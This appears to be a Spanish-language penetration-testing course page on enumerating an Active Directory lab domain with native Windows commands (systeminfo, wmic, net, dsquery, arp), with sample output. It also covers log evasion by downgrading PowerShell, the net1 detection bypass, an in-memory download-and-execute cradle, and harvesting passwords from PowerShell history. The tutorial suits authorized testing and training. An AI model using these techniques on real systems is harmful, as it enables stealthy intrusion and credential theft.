
# AD: Enumeración nativa en Windows

Anteriormente en el módulo, practicamos varias herramientas y técnicas (con credenciales y sin credenciales) para enumerar el entorno de AD. Estos métodos requerían que cargáramos o extrayéramos la herramienta en el Foothold o que tuviéramos un host de ataque dentro del entorno. En esta sección, analizaremos varias técnicas para utilizar herramientas nativas de Windows para realizar nuestra enumeración y luego las practicaremos desde nuestro host de ataque de Windows.

***

## <mark style="color:purple;">Living off the land</mark>

Supongamos que nuestro cliente nos ha pedido que probemos su entorno de AD desde un host administrado sin acceso a Internet, y todos los esfuerzos para cargar herramientas en él han fallado. Nuestro cliente quiere ver qué tipos de enumeración son posibles, por lo que tendremos que recurrir a técnicas conocidas cómo "living off the land" o solo usar `herramientas` y `comandos nativos` de Windows/Active Directory. Este también puede ser un `enfoque más sigiloso` y es posible que no cree tantas entradas de registro y alertas como la incorporación de herramientas a la red en las secciones anteriores.&#x20;

La mayoría de los entornos empresariales actuales tienen algún tipo de `monitoreo` y registro de red, incluidos IDS/IPS, firewalls y sensores y herramientas pasivos sobre sus defensas basadas en host, como Windows Defender o EDR empresarial. Dependiendo del entorno, también pueden tener herramientas que toman una línea base de tráfico de red "normal" y buscan anomalías. Debido a esto, nuestras posibilidades de ser atrapados aumentan exponencialmente cuando comenzamos a incorporar herramientas al entorno desde afuera.

***

## <mark style="color:purple;">Comandos para reconocimiento de red y host</mark>

Primero, cubriremos algunos comandos básicos que pueden usarse para brindarnos más información sobre el host en el que estamos.

**Comandos básicos de enumeración**

<table data-header-hidden><thead><tr><th width="333"></th><th></th></tr></thead><tbody><tr><td><strong>Dominio</strong></td><td><strong>Resultado</strong></td></tr><tr><td><code>hostname</code></td><td>Imprime el nombre de la PC</td></tr><tr><td><code>[System.Environment]::OSVersion.Version</code></td><td>Imprime la versión del sistema operativo y el nivel de revisión.</td></tr><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Imprime los parches y revisiones aplicadas al host</td></tr><tr><td><code>ipconfig /all</code></td><td>Imprime el estado y las configuraciones del adaptador de red.</td></tr><tr><td><code>set</code></td><td>Muestra una lista de variables de entorno para la sesión actual (ejecutada desde el símbolo del sistema)</td></tr><tr><td><code>echo %USERDOMAIN%</code></td><td>Muestra el nombre de dominio al que pertenece el host (ejecutado desde el símbolo del sistema CMD)</td></tr><tr><td><code>echo %logonserver%</code></td><td>Imprime el nombre del controlador de dominio con el que el host se registra (se ejecuta desde el símbolo del sistema CMD)</td></tr></tbody></table>

**Enumeración básica**

![imagen](https://academy.hackthebox.com/storage/modules/143/basic-enum.png)

Los comandos anteriores nos darán una idea inicial rápida del estado en el que se encuentra el host, así como información básica sobre redes y dominios. Podemos cubrir la información anterior con un solo comando [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo) .

### **systeminfo**

![imagen](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)

El comando `systeminfo`, como se ve arriba, imprimirá un resumen de la información del host en una salida ordenada. Al ejecutar un comando se generarán menos registros, lo que significa que habrá menos posibilidades de que un defensor nos detecte en el host.

***

## <mark style="color:purple;">Aprovechar PowerShell</mark>

PowerShell existe desde 2006 y ofrece a los administradores de sistemas de Windows un amplio marco para administrar todas las facetas de los sistemas de Windows y los entornos de AD. Es un lenguaje de programación potente y se puede utilizar para analizar en profundidad los sistemas. PowerShell tiene muchas funciones y módulos integrados que podemos utilizar en una tarea para reconocer el host y la red, y enviar y recibir archivos.

Veamos algunas de las formas en que PowerShell puede ayudarnos.

<table data-header-hidden><thead><tr><th width="372"></th><th></th></tr></thead><tbody><tr><td><strong>Cmd-Dejar</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>Get-Module</code></td><td>Enumera los módulos disponibles cargados para su uso.</td></tr><tr><td><code>Get-ExecutionPolicy -List</code></td><td>Imprimirá la configuración <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">de la política de ejecución</a> para cada ámbito en un host.</td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>Esto cambiará la política de nuestro proceso actual que utiliza el parámetro <code>-Scope</code>. Al hacerlo, se revertirá la política una vez que desalojemos el proceso o lo finalicemos. Esto es ideal porque no realizaremos un cambio permanente en el host víctima.</td></tr><tr><td><code>Get-Content C:\Users\&#x3C;USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td><td>Con esta cadena, podemos obtener el historial de PowerShell del usuario especificado. Esto puede resultar bastante útil, ya que el historial de comandos puede contener contraseñas o indicarnos archivos de configuración o scripts que contienen contraseñas.</td></tr><tr><td><code>Get-ChildItem Env: | ft Key,Value</code></td><td>Devuelve valores del entorno, como rutas de claves, usuarios, información de la computadora, etc.</td></tr><tr><td><code>powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &#x3C;follow-on commands>"</code></td><td>Esta es una forma rápida y sencilla de descargar un archivo de la web usando PowerShell y llamarlo desde la memoria.</td></tr></tbody></table>

Veámoslos en acción ahora en el host `MS01`.

### **Comprobaciones rápidas mediante PowerShell**

```powershell
# Módulos diponibles
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...

# Configuración de la Política de Ejecución
PS C:\htb> Get-ExecutionPolicy -List
Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned

# Mostrar usuario actual
PS C:\htb> whoami
nt authority\system

# Valores de entorno
PS C:\htb> Get-ChildItem Env: | ft key,value

Get-ChildItem Env: | ft key,value

Key                     Value
---                     -----
ALLUSERSPROFILE         C:\ProgramData
APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming
CommonProgramFiles      C:\Program Files (x86)\Common Files
CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
CommonProgramW6432      C:\Program Files\Common Files
COMPUTERNAME            ACADEMY-EA-MS01
ComSpec                 C:\Windows\system32\cmd.exe
DriverData              C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS    4
OS                      Windows_NT
Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...
PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE  x86
PROCESSOR_ARCHITEW6432  AMD64
PROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL         23
PROCESSOR_REVISION      3100
ProgramData             C:\ProgramData
ProgramFiles            C:\Program Files (x86)
ProgramFiles(x86)       C:\Program Files (x86)
ProgramW6432            C:\Program Files
PROMPT                  $P$G
PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...
PUBLIC                  C:\Users\Public
SystemDrive             C:
SystemRoot              C:\Windows
TEMP                    C:\Windows\TEMP
TMP                     C:\Windows\TEMP
USERDOMAIN              INLANEFREIGHT
USERNAME                ACADEMY-EA-MS01$
USERPROFILE             C:\Windows\system32\config\systemprofile
windir                  C:\Windows
```

Hemos realizado una `enumeración básica` del host. Ahora, analicemos algunas tácticas de `seguridad operativa`.

### **Degradar Powershell**

Muchos defensores no saben que, a menudo, existen varias versiones de PowerShell en un host. Si no se desinstalan, se pueden seguir utilizando. El registro de eventos de PowerShell se introdujo como una característica con PowerShell 3.0 y versiones posteriores. Con eso en mente, podemos intentar llamar a la `versión 2.0` o anterior de PowerShell. Si tenemos éxito, nuestras acciones desde el shell `no se registrarán en el Visor de eventos`. Esta es una excelente manera de permanecer fuera del radar de los defensores y, al mismo tiempo, seguir utilizando los recursos integrados en los hosts para nuestro beneficio. A continuación, se muestra un ejemplo de degradación de PowerShell.

```powershell
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

Ahora podemos ver que estamos ejecutando una versión anterior de PowerShell a partir de la salida anterior. Observe la diferencia en la versión informada. Valida que hemos degradado con éxito el shell. Verifiquemos y veamos si aún estamos escribiendo registros. El lugar principal para buscar es en `PowerShell Operational Log` que se ubica en `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. Todos los comandos ejecutados en nuestra sesión se registrarán en este archivo.&#x20;

El registro `Windows PowerShell` ubicado en `Applications and Services Logs > Windows PowerShell` también es un buen lugar para verificar. Se creará una entrada aquí cuando iniciemos una instancia de PowerShell. En la imagen a continuación, podemos ver las entradas rojas realizadas en el registro desde la sesión actual de PowerShell y la salida de la última entrada realizada a las 2:12 p. m. cuando se realiza la degradación. Fue la última entrada desde que nuestra sesión se trasladó a una versión de PowerShell que ya no puede registrar. Observe que ese evento corresponde con el último evento en las entradas `Windows PowerShell` del registro.

### **Examinar el registro de eventos de PowerShell**

![texto](https://academy.hackthebox.com/storage/modules/143/downgrade.png)

Con [el registro de bloques de scripts](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) habilitado, podemos ver que todo lo que escribimos en la terminal se envía a este registro. Si cambiamos a PowerShell V2, esto ya no funcionará correctamente. Nuestras acciones posteriores estarán enmascaradas ya que el registro de bloques de scripts no funciona en versiones anteriores a PowerShell 3.0. Observe arriba en los registros que podemos ver los comandos que emitimos durante una sesión de shell normal, pero se detuvo después de iniciar una nueva instancia de PowerShell en la versión 2.&#x20;

Tenga en cuenta que la acción de emitir el comando `powershell.exe -version 2` dentro de la sesión de PowerShell se registrará. Por lo tanto, quedará evidencia que muestra que se produjo la degradación, y un defensor sospechoso o vigilante puede iniciar una investigación después de ver que esto sucede y que los registros ya no se llenan para esa instancia. Podemos ver un ejemplo de esto en la imagen a continuación. Los elementos en el cuadro rojo son las entradas del registro antes de iniciar la nueva instancia, y la información en verde es el texto que muestra que se inició una nueva sesión de PowerShell en HostVersion 2.0.

### **Iniciando registros V2**

![texto](https://academy.hackthebox.com/storage/modules/143/start-event.png)

***

## <mark style="color:purple;">Comprobando las defensas</mark>

Los siguientes comandos utilizan las utilidades [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) y [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) para ayudarnos a tener una idea del estado del host en lo que respecta a la configuración del Firewall de Windows y para verificar el estado de Windows Defender.

### **Comprobaciones del Firewall**

```powershell
PS C:\htb> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Private Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096
```

### **Comprobación de Windows Defender (desde CMD)**

```powershell
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Arriba, verificamos si Defender estaba en ejecución. A continuación, verificaremos el estado y la configuración con el cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) en PowerShell.

### **Get-MpComputerStatus**

```powershell
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2

<SNIP>
```

Saber en qué revisión se encuentra nuestra configuración de antivirus y qué configuraciones están habilitadas o deshabilitadas puede ser de gran utilidad. Podemos saber con qué frecuencia se ejecutan los análisis, si la alerta de amenazas a pedido está activa y más. Esta información también es muy útil para generar informes. A menudo, los defensores pueden pensar que ciertas configuraciones están habilitadas o que los análisis están programados para ejecutarse en ciertos intervalos. Si ese no es el caso, estos hallazgos pueden ayudarlos a solucionar esos problemas.

***

## <mark style="color:purple;">¿Estoy solo?</mark>

Cuando ingresas a un host por primera vez, algo importante es verificar si eres el único que ha iniciado sesión. Si comienzas a realizar acciones desde un host en el que se encuentra otra persona, existe la posibilidad de que se den cuenta. Si se abre una ventana emergente o un usuario cierra la sesión, es posible que informe estas acciones o cambie su contraseña, y podríamos perder nuestra posición.

### **Usando qwinsta**

```powershell
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

Ahora que tenemos una idea clara del estado de nuestro host, podemos enumerar las configuraciones de red para nuestro host e identificar cualquier máquina o servicio de dominio potencial al que queramos apuntar a continuación.

### Información de la red

<table data-header-hidden><thead><tr><th width="325"></th><th></th></tr></thead><tbody><tr><td><strong>Comandos de red</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>arp -a</code></td><td>Enumera todos los hosts conocidos almacenados en la tabla arp.</td></tr><tr><td><code>ipconfig /all</code></td><td>Imprime la configuración del adaptador para el host. Podemos averiguar el segmento de red desde aquí.</td></tr><tr><td><code>route print</code></td><td>Muestra la tabla de enrutamiento (IPv4 e IPv6) que identifica las redes conocidas y las rutas de capa tres compartidas con el host.</td></tr><tr><td><code>netsh advfirewall show state</code></td><td>Muestra el estado del firewall del host. Podemos determinar si está activo y filtrando el tráfico.</td></tr></tbody></table>

Comandos como `ipconfig /all` y `systeminfo` nos muestran algunas configuraciones de red básicas. Dos comandos más importantes nos brindan una gran cantidad de datos valiosos y podrían ayudarnos a mejorar nuestro acceso. `arp -a` y `route print` nos mostrará qué hosts conoce la máquina en la que estamos y qué redes conoce el host. Cualquier red que aparezca en la tabla de enrutamiento es una vía potencial para el movimiento lateral porque se accede a ella lo suficiente como para que se haya agregado una ruta o se haya configurado administrativamente allí para que el host sepa cómo acceder a los recursos en el dominio. Estos dos comandos pueden ser especialmente útiles en la fase de descubrimiento de una evaluación de caja negra donde tenemos que limitar nuestro escaneo.

### **Usando arp -a**

```powershell
PS C:\htb> arp -a

Interface: 172.16.5.25 --- 0x8
  Internet Address      Physical Address      Type
  172.16.5.5            00-50-56-b9-08-26     dynamic
  172.16.5.130          00-50-56-b9-f0-e1     dynamic
  172.16.5.240          00-50-56-b9-9d-66     dynamic
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 10.129.201.234 --- 0xc
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-b9-fc     dynamic
  10.129.202.29         00-50-56-b9-26-8d     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

### **Visualización de la tabla de enrutamiento**

```powershell
PS C:\htb> route print

===========================================================================
Interface List
  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
  ===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       172.16.5.1  Default
===========================================================================

IPv6 Route Table
===========================================================================

<SNIP>
```

El uso de `arp -a` y `route print` no solo resultará beneficioso para enumerar los entornos de AD, sino que también nos ayudará a identificar oportunidades para cambiar a diferentes segmentos de red en cualquier entorno. Estos son comandos que deberíamos considerar usar en cada interacción para ayudar a nuestros clientes a comprender a dónde puede intentar dirigirse un atacante después de un ataque inicial.

***

## <mark style="color:purple;">Instrumental de administración de Windows (WMI)</mark>

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) es un motor de scripts que se utiliza ampliamente en entornos empresariales de Windows para recuperar información y ejecutar tareas administrativas en hosts locales y remotos. Para nuestro uso, crearemos un informe WMI sobre usuarios, grupos, procesos y otra información del dominio de nuestro host y otros hosts del dominio.

### **Comprobaciones rápidas de WMI**

| **Dominio**                                                                          | **Descripción**                                                                                                               |
| ------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Imprime el nivel del parche y la descripción de las revisiones aplicadas                                                      |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Muestra información básica del host para incluir cualquier atributo dentro de la lista                                        |
| `wmic process list /format:list`                                                     | Una lista de todos los procesos en el host                                                                                    |
| `wmic ntdomain list /format:list`                                                    | Muestra información sobre el dominio y los controladores de dominio.                                                          |
| `wmic useraccount list /format:list`                                                 | Muestra información sobre todas las cuentas locales y cualquier cuenta de dominio que haya iniciado sesión en el dispositivo. |
| `wmic group list /format:list`                                                       | Información sobre todos los grupos locales                                                                                    |
| `wmic sysaccount list /format:list`                                                  | Vuelca información sobre cualquier cuenta del sistema que se esté utilizando como cuentas de servicio.                        |

A continuación, podemos ver información sobre el dominio y el dominio secundario, y el bosque externo con el que nuestro dominio actual tiene una relación de confianza. Esta [hoja de referencia](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) tiene algunos comandos útiles para consultar información de host y dominio mediante wmic.

```powershell
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

WMI es un tema muy amplio y sería imposible tratar todas sus posibilidades en una sola sección. Para obtener más información sobre WMI y sus capacidades, consulte la [documentación oficial de WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi) .

***

## <mark style="color:purple;">Comandos de red</mark>

[Los comandos de red](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) pueden resultarnos útiles cuando intentamos enumerar información del dominio. Estos comandos se pueden utilizar para consultar el host local y los host remotos, de forma muy similar a las capacidades que ofrece WMI. Podemos enumerar información como:

* `Usuarios locales y de dominio`
* `Grupos`
* `Hosts`
* `Usuarios específicos en grupos`
* `Controladores de dominio`
* `Requisitos de contraseña`

A continuación, abordaremos algunos ejemplos. Tenga en cuenta que las soluciones EDR suelen supervisar los comandos `net.exe` y pueden revelar rápidamente nuestra ubicación si nuestra evaluación tiene un componente evasivo. Algunas organizaciones incluso configurarán sus herramientas de supervisión para que emitan alertas si los usuarios ejecutan determinados comandos en unidades organizativas específicas, como la cuenta de un asociado de marketing que ejecuta comandos como `whoami`, y `net localgroup administrators`, etc. Esto podría ser una señal de alerta obvia para cualquiera que supervise intensamente la red.

### **Tabla de comandos de red útiles**

| **Dominio**                                     | **Descripción**                                                                                                                                        |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `net accounts`                                  | Información sobre los requisitos de contraseña                                                                                                         |
| `net accounts /domain`                          | Política de contraseñas y bloqueos                                                                                                                     |
| `net group /domain`                             | Información sobre grupos de dominios                                                                                                                   |
| `net group "Domain Admins" /domain`             | Lista de usuarios con privilegios de administrador de dominio                                                                                          |
| `net group "domain computers" /domain`          | Lista de PCs conectadas al dominio                                                                                                                     |
| `net group "Domain Controllers" /domain`        | Lista de cuentas de PC de controladores de dominio                                                                                                     |
| `net group <domain_group_name> /domain`         | Usuario que pertenece al grupo                                                                                                                         |
| `net groups /domain`                            | Lista de grupos de dominios                                                                                                                            |
| `net localgroup`                                | Todos los grupos disponibles                                                                                                                           |
| `net localgroup administrators /domain`         | Enumere los usuarios que pertenecen al grupo de administradores dentro del dominio (el grupo `Domain Admins` se incluye aquí de manera predeterminada) |
| `net localgroup Administrators`                 | Información sobre un grupo (administradores)                                                                                                           |
| `net localgroup administrators [username] /add` | Agregar usuario a administradores                                                                                                                      |
| `net share`                                     | Consultar acciones actuales                                                                                                                            |
| `net user <ACCOUNT_NAME> /domain`               | Obtener información sobre un usuario dentro del dominio                                                                                                |
| `net user /domain`                              | Listar todos los usuarios del dominio                                                                                                                  |
| `net user %username%`                           | Información sobre el usuario actual                                                                                                                    |
| `net use x: \computer\share`                    | Montar el recurso compartido localmente                                                                                                                |
| `net view`                                      | Obtener una lista de computadoras                                                                                                                      |
| `net view /all /domain[:domainname]`            | Acciones en los dominios                                                                                                                               |
| `net view \computer /ALL`                       | Lista de acciones de una computadora                                                                                                                   |
| `net view /domain`                              | Lista de PCs del dominio                                                                                                                               |

### **Listado de grupos de dominios**

```powershell
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>
```

Podemos ver arriba que el comando `net group` nos proporcionó una lista de grupos dentro del dominio.

### **Información sobre un usuario de dominio**

```powershell
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/27/2021 10:38:01 AM
Password expires             Never
Password changeable          10/28/2021 10:38:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Warehouse            *Printer Access
                             *Domain Users         *VPN Users
                             *Shared Calendar Read
The command completed successfully.
```

### **Truco de comandos de red**

Si cree que los defensores de la red están registrando o buscando activamente comandos fuera de lo normal, puede probar esta solución alternativa: usar comandos net. Si escribe `net1` en lugar de , `net` se ejecutarán las mismas funciones `sin el posible desencadenador` de la cadena net.

**Ejecutando el comando Net1**

![imagen](https://academy.hackthebox.com/storage/modules/143/net1userreal.png)

***

## <mark style="color:purple;">Dsquery</mark>

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) es una útil herramienta de línea de comandos que se puede utilizar para buscar objetos de Active Directory. Las consultas que ejecutamos con esta herramienta se pueden replicar fácilmente con herramientas como BloodHound y PowerView, pero es posible que no siempre tengamos esas herramientas a nuestra disposición, como se explicó al principio de la sección. Sin embargo, es probable que los administradores de sistemas de dominio utilicen esta herramienta en su entorno. Teniendo esto en cuenta, `dsquery` existirá en cualquier host que tenga `Active Directory Domain Services Role` instalado, y el DLL `dsquery` existe en todos los sistemas Windows modernos de forma predeterminada y se puede encontrar en `C:\Windows\System32\dsquery.dll`.

### **DLL de Dsquery**

Todo lo que necesitamos son `privilegios elevados` en un host o la capacidad de ejecutar una CMD o PowerShell desde un contexto `SYSTEM`. A continuación, mostraremos la función de búsqueda básica `dsquery` y algunos filtros de búsqueda útiles.

### **Búsqueda de usuarios**

```powershell
PS C:\htb> dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
